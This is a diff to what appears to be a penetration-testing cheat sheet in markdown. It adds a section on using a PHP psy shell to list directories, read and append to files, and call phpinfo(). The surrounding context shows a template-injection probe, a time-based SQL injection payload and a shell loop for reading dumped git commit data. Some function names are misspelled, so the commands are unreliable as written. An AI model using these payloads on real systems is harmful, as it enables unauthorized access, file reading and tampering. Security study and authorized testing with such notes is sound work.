@@ -6,6 +6,7 @@
   - [Wordpres](#wordpres)
 - [API](#api)
   - [Git Enumeration](#git-enumeration)
+  - [PHP psy shell](#php-psy-shell)
 
 ## Server Side Template Injection
 {{7x7}}
@@ -346,3 +347,14 @@ admin123' UNION SELECT SLEEP(5),2;--
   - finder: search for exposed g.t
   - Read files: 
     - separator="======================================="; for i in $(ls); do printf "\n\n$separator\n\033[4;1m$i\033[0m\n$(cat $i/commit-meta.txt)\n"; done; printf "\n\n$separator\n\n\n"
+
+## PHP psy shell
+- Check folders
+scandir("/")
+- Check files
+file_get_content("/path/to/file")
+- write file
+file_put_content("path/to/file", "content", FILE_APPEND)
+
+phpinfo()
+ls
